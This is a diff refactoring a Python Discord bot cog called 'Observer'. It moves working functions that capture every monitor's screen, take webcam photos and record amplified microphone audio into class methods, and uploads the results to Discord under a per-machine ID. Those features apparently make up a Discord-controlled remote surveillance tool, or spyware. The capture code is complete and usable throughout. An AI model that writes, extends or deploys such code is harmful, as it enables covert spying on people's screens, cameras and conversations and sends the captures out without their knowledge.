@@ -39,29 +39,8 @@ class Observer(commands.Cog):
         
         async with ctx.typing():
             try:
-                def capture_screens():
-                    file_list = []
-                    
-                    with mss() as sct:
-                        monitors = sct.monitors[1:]
-                        
-                        if not monitors: 
-                            monitors = [sct.monitors[0]]
-
-                        for i, monitor in enumerate(monitors, start=1):
-                            sct_img = sct.grab(monitor)
-                            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-                            
-                            img_binary = io.BytesIO()
-                            img.save(img_binary, 'PNG')
-                            img_binary.seek(0)
-                            
-                            filename = f"{my_id}_Monitor_{i}.png"
-                            file_list.append(discord.File(fp=img_binary, filename=filename))
-                            
-                    return file_list, len(monitors)
                 loop = asyncio.get_running_loop()
-                files, count = await loop.run_in_executor(None, capture_screens)
+                files, count = await loop.run_in_executor(None, self.capture_screens, my_id)
                 if count > 1:
                     msg = f"**[{my_id}]** Multi-Monitor Captured ({count} screens)"
                 else:
@@ -74,6 +53,28 @@ class Observer(commands.Cog):
 
             except Exception as e:
                 await ctx.send(f"**[{my_id}]** Error: {e}")
+
+    def capture_screens(self, myid: str):
+        file_list = []
+                    
+        with mss() as sct:
+            monitors = sct.monitors[1:]
+                    
+            if not monitors: 
+                monitors = [sct.monitors[0]]
+
+            for i, monitor in enumerate(monitors, start=1):
+                sct_img = sct.grab(monitor)
+                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+                            
+                img_binary = io.BytesIO()
+                img.save(img_binary, 'PNG')
+                img_binary.seek(0)
+                            
+                filename = f"{myid}_Monitor_{i}.png"
+                file_list.append(discord.File(fp=img_binary, filename=filename))
+                            
+        return file_list, len(monitors)
 
     @commands.command(name="webcam", aliases=["cam"])
     async def take_webcam(self, ctx, arg: str = None, num: int = 1):
@@ -184,66 +185,8 @@ class Observer(commands.Cog):
         async with self.cam_lock:
             async with ctx.typing():
                 try:
-                    def capture_cam_safe():
-                        cap = cv2.VideoCapture(target_index, cv2.CAP_ANY)
-                        if not cap.isOpened():
-                            print("Cannot open camera")
-                            cap = cv2.VideoCapture(target_index)
-                            if not cap.isOpened():
-                                return None, "Camera not found."
-                            
-                        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
-
-                        resolutions = [
-                            (3840, 2160), # 4K
-                            (2560, 1440), # QHD
-                            (1920, 1080), # FHD 
-                            (1280, 720),  # HD
-                            (640, 480)    # VGA 
-                        ]
-                        
-                        selected_res = "Default"
-
-                        for width, height in resolutions:
-                            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
-                            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
-                            
-                            actual_w = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
-                            actual_h = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
-                            
-                            if actual_w == width and actual_h == height:
-                                selected_res = f"{int(actual_w)}x{int(actual_h)}"
-                                break
-
-                        print(f"[Webcam] Resolution set to: {selected_res}")
-
-                    
-                        for _ in range(30):
-                            ret, temp_frame = cap.read()
-                            if not ret: continue
-                            
-                            if np.sum(temp_frame) > 0:
-                                break
-                        
-                        for _ in range(10): cap.read()
-
-                        ret, frame = cap.read()
-                        cap.release()
-
-                        if not ret:
-                            return None, "Failed to capture."
-                        
-                        if np.sum(frame) == 0:
-                            return None, "Captured black screen (Camera error)."
-
-                        success, buffer = cv2.imencode(".png", frame)
-                        if not success:
-                            return None, "Encoding failed."
-
-                        return io.BytesIO(buffer.tobytes()), selected_res
-
                     loop = asyncio.get_running_loop()
-                    image_binary, res_info = await loop.run_in_executor(None, capture_cam_safe)
+                    image_binary, res_info = await loop.run_in_executor(None, self.capture_cam_safe, target_index)
 
                     if image_binary:
                         file = discord.File(fp=image_binary, filename=f"webcam_{my_id}.png")
@@ -254,6 +197,66 @@ class Observer(commands.Cog):
 
                 except Exception as e:
                     await ctx.send(f"**[{my_id}]** System Error: {e}")
+
+
+    def capture_cam_safe(self,target_index: int):
+        cap = cv2.VideoCapture(target_index, cv2.CAP_ANY)
+        if not cap.isOpened():
+            print("Cannot open camera")
+            cap = cv2.VideoCapture(target_index)
+            if not cap.isOpened():
+                return None, "Camera not found."
+                            
+        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
+
+        resolutions = [
+            (3840, 2160), # 4K
+            (2560, 1440), # QHD
+            (1920, 1080), # FHD 
+            (1280, 720),  # HD
+            (640, 480)    # VGA 
+        ]
+                        
+        selected_res = "Default"
+
+        for width, height in resolutions:
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
+            
+            actual_w = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
+            actual_h = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
+            
+            if actual_w == width and actual_h == height:
+                selected_res = f"{int(actual_w)}x{int(actual_h)}"
+                break
+
+        print(f"[Webcam] Resolution set to: {selected_res}")
+
+    
+        for _ in range(30):
+            ret, temp_frame = cap.read()
+            if not ret: continue
+            
+            if np.sum(temp_frame) > 0:
+                break
+        
+        for _ in range(10): cap.read()
+
+        ret, frame = cap.read()
+        cap.release()
+
+        if not ret:
+            return None, "Failed to capture."
+        
+        if np.sum(frame) == 0:
+            return None, "Captured black screen (Camera error)."
+
+        success, buffer = cv2.imencode(".png", frame)
+        if not success:
+            return None, "Encoding failed."
+
+        return io.BytesIO(buffer.tobytes()), selected_res
+
 
     @commands.command(name="listen", aliases=["mic", "audio"])
     async def record_audio(self, ctx, arg: str = None, seconds: int = 10):
@@ -293,42 +296,8 @@ class Observer(commands.Cog):
 
         async with ctx.typing():
             try:
-                def record_to_ram():
-                    audio = pyaudio.PyAudio()
-                    try:
-                        stream = audio.open(
-                            format=FORMAT,
-                            channels=CHANNELS,
-                            rate=RATE,
-                            input=True,
-                            frames_per_buffer=CHUNK)
-                    except OSError:
-                        return None, "Microphone not found or access denied."
-
-                    frames = []
-                    
-                    for _ in range(0, int(RATE / CHUNK * seconds)):
-                        data = stream.read(CHUNK, exception_on_overflow=False)
-                        audio_data = np.frombuffer(data, dtype=np.int16)
-                        amplified = np.clip(audio_data * AMPLIFICATION_FACTOR, -32768, 32767)
-                        frames.append(amplified.astype(np.int16).tobytes())
-                        
-                    stream.stop_stream()
-                    stream.close()
-                    audio.terminate()
-                    
-                    audio_buffer = io.BytesIO()
-                    with wave.open(audio_buffer, 'wb') as wf:
-                        wf.setnchannels(CHANNELS)
-                        wf.setsampwidth(audio.get_sample_size(FORMAT))
-                        wf.setframerate(RATE)
-                        wf.writeframes(b''.join(frames))
-                    
-                    audio_buffer.seek(0) 
-                    return audio_buffer, "Success"
-
                 loop = asyncio.get_running_loop()
-                audio_data, msg = await loop.run_in_executor(None, record_to_ram)
+                audio_data, msg = await loop.run_in_executor(None, self.record_to_ram, seconds)
 
                 if audio_data:
                     file = discord.File(fp=audio_data, filename=f"audio_{my_id}.wav")
@@ -339,6 +308,41 @@ class Observer(commands.Cog):
 
             except Exception as e:
                 await ctx.send(f"**[{my_id}]** Mic Error: {e}")
+
+
+    def record_to_ram(self, seconds: int):
+        audio = pyaudio.PyAudio()
+        try:
+            stream = audio.open(
+                format=FORMAT,
+                channels=CHANNELS,
+                rate=RATE,
+                input=True,
+                frames_per_buffer=CHUNK)
+        except OSError:
+            return None, "Microphone not found or access denied."
+
+        frames = []
+                    
+        for _ in range(0, int(RATE / CHUNK * seconds)):
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            audio_data = np.frombuffer(data, dtype=np.int16)
+            amplified = np.clip(audio_data * AMPLIFICATION_FACTOR, -32768, 32767)
+            frames.append(amplified.astype(np.int16).tobytes())
+            
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+        
+        audio_buffer = io.BytesIO()
+        with wave.open(audio_buffer, 'wb') as wf:
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(audio.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+                    
+        audio_buffer.seek(0) 
+        return audio_buffer, "Success"
 
 async def setup(app: commands.Bot):
     await app.add_cog(Observer(app))
